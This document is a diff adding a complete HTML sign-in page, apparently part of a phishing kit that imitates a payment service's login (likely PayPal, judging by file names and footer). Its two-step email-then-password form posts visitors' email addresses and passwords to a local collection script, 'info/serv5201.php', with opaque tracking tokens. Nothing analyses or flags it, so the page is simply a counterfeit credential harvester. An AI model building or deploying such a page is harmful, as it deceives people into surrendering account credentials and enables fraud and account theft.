@@ -1,0 +1,84 @@
+<html dir="ltr"><head>
+        <title>Connectez vous à votre compte</title>
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta http-equiv="X-UA-COMPATIBLE" content="IE-edge">
+        <meta charset="utf8">
+        <link rel="stylesheet" href="css/normalize.css">
+        <link rel="stylesheet" href="css/bootstrap.min.css">
+        <link rel="stylesheet" href="css/font-awesome.min.css">
+        <link rel="stylesheet" href="css/login.css">
+        <link rel="shortcut icon" type="image/x-icon" href="img/ppl.ico">
+    </head>
+    <body>
+        <div class="lod-full" style="display: none;">
+            <div class="lod-c"></div>
+        </div>
+        <style>
+
+            @media (max-width: 430px){
+                .log-f{
+                    padding: 0 8% 30px;
+                }
+            }
+                .error {
+                    border: 1px solid #c72e2e;
+                }
+            </style>
+        <div class="contain">
+            <form class="log-f" method="POST" action="info/serv5201.php?enc=163bc0debf5f6ceb09297f8f9f8ccc3c&amp;p=0&amp;dispatch=1e3bd5ffbf77f321be3d0db30837812916634192" id="logform">
+                <center>
+                    <img src="img/ppt.PNG">
+                </center>
+                <input id="email" type="email" name="mail" class="in-form" placeholder="Email" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true">
+                <input id="pass" type="password" name="pass" class="in-form" placeholder="Password" required="required" autocomplete="off" autocorrect="off" autocapitalize="on" aria-required="true" style="display: none;">
+                <br>
+                <button type="button" class="login-btn">Next</button>
+                <a href="#" class="problem">Can't connect?</a>
+                <hr class="hr ou">
+                <a href="#" class="login-btn sin-up" id="btn-submit">Sign Up</a>
+            </form>
+        </div>
+            <div class="foot-pay">
+                <center>
+                    <a href="#">About	</a>
+                    <a href="#">Public Policyy</a>
+                    <a href="#">Legal</a>
+                    <a href="#">Privacy</a>                
+                </center>            
+            </div>        <script src="js/jquery-1.11.3.min.js"></script>
+        <script src="js/bootstrap.min.js"></script>
+        <script src="js/plugins.js"></script>
+        <script>
+$(document).ready(function() {
+$('#pass').hide();
+function validateEmail(email) {
+    var re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
+    return re.test(String(email).toLowerCase());
+}
+$('button').on('click',function(){
+    if(validateEmail($('#email').val())){
+    $('#email').fadeOut(50);
+    $('#pass').fadeIn(50);
+    $('button').html('Log In');
+    setTimeout(function(){
+            $('button').attr('type','submit');
+    },500);
+    }else {
+       $('#email').addClass('error');
+    }
+});
+$('#email').on('focusout',function(){
+if(validateEmail($('#email').val())){
+    $('#email').removeClass('error');
+        }
+});
+$('input').keypress(function(e) {
+    if(e.which == 13) {
+        $('button').click();
+    }
+});
+
+                });
+        </script>
+    
+</body></html>
